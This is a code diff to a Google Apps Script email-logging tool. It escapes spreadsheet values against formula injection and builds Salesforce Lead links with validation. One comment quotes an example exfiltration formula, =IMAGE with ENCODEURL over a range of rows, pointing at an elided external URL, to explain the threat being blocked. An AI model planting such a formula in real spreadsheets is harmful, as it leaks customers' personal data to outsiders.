@@ -169,23 +169,58 @@ function ivMessageLogRow_(message,recipient,state,detail){
  if(body.isHtml)notes.push('[BODY IS RAW HTML: getPlainBody() was empty]');
  // [R15] review 也要带 reason:Q10 收窄之后,不打标签的邮件只能靠这张表被看见,
  // 备注列不写原因等于让人对着一行"review"猜。
- if(state.state==='error'||state.state==='review')notes.push(String(state.reason||''));
+ // [Q18] 扩到所有状态:out-of-scope 现在是 done,只挡 error/review 的话它的
+ // 原因(发件人不在清单、推广邮件……)就从表里消失了。
+ if(state.reason)notes.push(String(state.reason));
  if(state.forced)notes.push('[FORCED]');
  var parsed=detail.parsed||null;
- return [
+ var row=[
   new Date().toISOString(),
   state.date||'',
   message.getId(),
   sender,
   recipient||'',
   ivTruncateCell_(message.getSubject()).text,
-  state.created?'created':state.state,
+  // [Q18] 建出 Lead 但落了 review(降级/来源冲突/强制)必须看得出来,
+  // 只写 'created' 会把例外藏起来 —— 以前每条都是 review,这个区分没有意义。
+  state.created?(state.state==='review'?'created + review':'created'):state.state,
   parsed?(parsed.kind+' / '+parsed.confidence):'',
   parsed?ivTruncateCell_(JSON.stringify(parsed)).text:'{}',
-  state.record||'',
+  '',
   ivTruncateCell_(notes.join(' ')).text,
   cell.text
- ];
+ ].map(ivSheetText_);
+ row[9]=ivLeadCell_(state.record);
+ return row;
+}
+
+/**
+ * [安全] 防 Sheets 公式注入(D-033)。
+ *
+ * setValues 对以 = + - @ 开头的字符串**按用户输入解析**,会当成公式执行。
+ * 主题、正文、发件人都是外部发件人可控的,而任何人都能往组里投信 —— 一封主题为
+ * =IMAGE("https://…?"&ENCODEURL(L2:L50)) 的邮件,会在有人打开表格时把其他行的
+ * 正文(含客户 PII)发到外部地址。前置一个单引号强制按文本存,单引号本身不显示。
+ * 顺带让 +61… 这类电话号码不再被转成数字。
+ */
+function ivSheetText_(v){
+ var t=v===null||v===undefined?'':String(v);
+ return /^[=+\-@]/.test(t)?"'"+t:t;
+}
+
+/**
+ * [Q18] SF Lead ID 列写成可点的链接,**只在写入时生成一次**,不回头改历史行。
+ * 这一格是整行里**唯一**允许是公式的,所以它不走 ivSheetText_,而是自己把关:
+ * Id 必须是合法的 Lead Id 形状、instance_url 必须是 https 且不含引号,
+ * 否则退回纯文本 Id。本轮没调用过 Salesforce(没有 token)时同样退回纯文本。
+ */
+function ivLeadCell_(id){
+ if(!id)return '';
+ id=String(id);
+ if(!/^00Q[A-Za-z0-9]{12}(?:[A-Za-z0-9]{3})?$/.test(id))return ivSheetText_(id);
+ var base=ivReq_.token&&ivReq_.token.instance_url;
+ if(!base||!/^https:\/\/[^"\s]+$/.test(String(base)))return id;
+ return '=HYPERLINK("'+ivRecordUrl_('Lead',id)+'","'+id+'")';
 }
 
 /**
